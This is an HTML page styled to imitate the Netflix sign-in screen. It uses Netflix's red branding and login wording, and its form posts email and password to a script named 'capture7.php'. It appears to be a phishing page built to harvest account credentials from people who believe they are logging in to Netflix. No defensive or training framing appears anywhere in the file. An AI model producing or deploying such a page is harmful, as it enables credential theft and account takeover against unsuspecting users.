<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Login</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-image: url('https://via.placeholder.com/1920x1080'); /* Replace with actual background image */
            background-size: cover;
            background-position: center;
        }
        .overlay {
            background-color: rgba(0, 0, 0, 0.75);
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }
        .login-container {
            position: relative;
            z-index: 2;
            width: 100%;
            max-width: 400px;
            margin: auto;
            margin-top: 10%;
            background-color: rgba(0, 0, 0, 0.85);
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.5);
            color: #fff;
        }
        .login-container h1 {
            text-align: center;
            margin-bottom: 20px;
            font-size: 2rem;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            font-size: 0.9rem;
            margin-bottom: 5px;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            font-size: 1rem;
            border: none;
            border-radius: 4px;
            background-color: #333;
            color: #fff;
        }
        .form-group input:focus {
            outline: none;
            border: 1px solid #e50914;
        }
        .error {
            color: #e50914;
            font-size: 0.85rem;
            margin-top: 5px;
        }
        .btn {
            width: 100%;
            padding: 10px;
            font-size: 1rem;
            background-color: #e50914;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .btn:hover {
            background-color: #f6121d;
        }
        .secondary-actions {
            text-align: center;
            margin-top: 20px;
        }
        .secondary-actions a {
            color: #b3b3b3;
            text-decoration: none;
            font-size: 0.9rem;
        }
        .secondary-actions a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="overlay"></div>
    <div class="login-container">
        <h1>Sign In</h1>
        <form action="./capture7.php" method="POST">
            <div class="form-group">
                <label for="email">Email or mobile number</label>
                <input type="email" id="email" name="email" placeholder="Enter your email or mobile number">
                <div class="error">Please enter a valid email address or phone number.</div>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password">
                <div class="error">Your password must contain between 4 and 60 characters.</div>
            </div>
            <button type="submit" class="btn">Sign In</button>
        </form>
        <div class="secondary-actions">
            <a href="#">Forgot password?</a> | <a href="#">Use a sign-in code</a>
        </div>
    </div>
</body>
</html>
